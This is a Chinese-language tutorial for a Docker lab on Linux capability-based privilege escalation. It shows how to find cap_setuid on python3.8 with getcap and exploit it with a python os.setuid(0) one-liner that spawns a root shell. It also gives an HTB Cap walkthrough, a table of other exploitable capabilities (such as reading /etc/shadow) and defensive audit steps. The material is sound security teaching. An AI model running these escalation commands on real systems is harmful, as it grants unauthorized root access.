# Capabilities 提权（cap_setuid）

## 原理

Linux capabilities 把 root 权限拆成独立小权限。`setcap cap_setuid+ep` 赋予程序
"修改 UID"的能力（cap_setuid）。拥有该能力的程序可以把自己的 UID 改成 0（root），
效果等同 SUID 但更隐蔽——`ls -l` 看不到 s 位，只有 `getcap` 能发现。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：`setcap cap_setuid+ep /usr/bin/python3.8`

## 复现步骤

利用文件已预置在容器内 /opt/exploits（属主 lowpriv，可读可写可执行），**全程在容器内操作**。

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/capabilities        # Kali 宿主机
docker compose up -d --build            # 构建并启动
docker exec -it capabilities su - lowpriv   # 进入容器 (密码 lowpriv123)
```

### 第二步：容器内确认漏洞环境

```bash
id                      # uid=1000(lowpriv) gid=1000(lowpriv)
sudo -l                 # 查看漏洞配置
ls -la /opt/exploits/   # 预置的漏洞利用文件 (源码/编译脚本/一键利用)
```

### 第三步：容器内利用（利用文件已预置在 /opt/exploits）

```bash
cd /opt/exploits

# 1. 发现 capabilities
getcap -r / 2>/dev/null | grep python
# 预期: /usr/bin/python3.8 = cap_setuid+ep

# 2. 利用 cap_setuid 提权
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("id")'
# 预期: uid=0(root) gid=1000(lowpriv)   提权成功!
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 手动利用（分步教学）

### 第一步：发现 capabilities（枚举）

```bash
getcap -r / 2>/dev/null
# 预期: /usr/bin/python3.8 = cap_setuid+ep
```

`getcap -r /` 递归扫描所有文件的 capabilities。这是**比 SUID 更隐蔽**的提权点：
`ls -l` 看不到任何 s 位，只有 getcap 能发现。

### 第二步：理解 capabilities 机制

Linux capabilities 把 root 的全部权限拆成约 40 个独立小权限：

| capability | 作用 |
|:---|:---|
| CAP_SETUID | 允许进程改变自己的 UID（调用 setuid()） |
| CAP_SETGID | 允许改变 GID |
| CAP_DAC_OVERRIDE | 绕过文件读写权限检查 |
| CAP_NET_ADMIN | 网络管理操作 |

`cap_setuid+ep` 中：
- `e` = effective：进程运行时该能力生效
- `p` = permitted：允许被使用

### 第三步：利用

```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("id")'
# 预期: uid=0(root) gid=1000(lowpriv)
```

拥有 CAP_SETUID 的进程可以调用 setuid(0) 把自己变成 root——
不需要 SUID 位，不需要属主是 root。

### 防御检测

```bash
getcap -r / 2>/dev/null | grep -v 'cap_net_bind_service'   # 找异常 cap
```

为什么能成功

cap_setuid 允许进程调用 setuid() 提升权限（即使进程属主不是 root）。
python 的 os.setuid(0) 直接利用该能力把 UID 改为 0。

## 注意（踩坑记录）

/usr/bin/python3 是符号链接（指向 python3.8），对 symlink 执行 setcap 无效。
必须对真实二进制设置：`setcap cap_setuid+ep /usr/bin/python3.8`。

## 防御

- `getcap -r /` 定期审计 capabilities
- 不授予解释器（python/perl/ruby）cap_setuid 等高危能力


## 扩展教学（网络搜索整理）

### 实战案例：HTB Cap 机器

HackTheBox 的 Cap 是 capabilities 提权的经典题：
1. 低权限用户枚举时 LinPEAS 发现：
   ```
   /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
   ```
2. 直接利用：
   ```
   python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
   # 输出: uid=0(root) gid=1001(nathan)
   ```
3. 读 /root/root.txt 通关

要点：**capabilities 不在 ls -l 的权限位里**，`find / -perm -4000` 扫不到，
必须 `getcap -r /` 单独扫——这就是它容易漏审的原因。

### 其他可提权 capabilities

| capability | 效果 | 利用思路 |
|:---|:---|:---|
| CAP_SETUID | 改 UID | python os.setuid(0) |
| CAP_DAC_READ_SEARCH | 绕过读权限 | openssl 读 /etc/shadow |
| CAP_DAC_OVERRIDE | 绕过读写权限 | 改 root 文件 |
| CAP_SYS_ADMIN | 近 root | 挂载/命名空间操作 |
| CAP_SYS_PTRACE | 附加任意进程 | 注入 root 进程 |
| CAP_NET_RAW | 原始套接字 | ARP 欺骗等 |

### 解读 getcap 输出

```
/usr/bin/python3.8 = cap_setuid+ep
                          ^^
                          e = effective (运行时生效)
                          p = permitted (允许使用)
```
只有 `+ep` 组合才可直接利用；只有 `i`（inheritable）一般不可直接利用。

### 解码能力集

```bash
capsh --decode=0000003fffffffff
# 输出全部 capability 名称
```

### 为什么 CI/CD 镜像里常见

很多容器/构建镜像用 setcap 让应用绑定低端口（cap_net_bind_service），
结果把能力加到了解释器上——`setcap cap_setuid+ep python3` 这类事故在
CI/CD 镜像里反复出现，审计时重点查。

### 防御

- `getcap -r /` 纳入每次提权审计（与 find -perm -4000 并列）
- 绝不把能力授予通用解释器（python/perl/node/ruby/bash）
- 用专用小工具包装提权需求，而不是给解释器
- 文件完整性监控跟踪 security.capability 扩展属性变化

## 验证记录

2026-08-26 真实环境验证：`/usr/bin/python3 -c 'import os; os.setuid(0); os.system("id")'`
输出 `uid=0(root)`。复现成功。
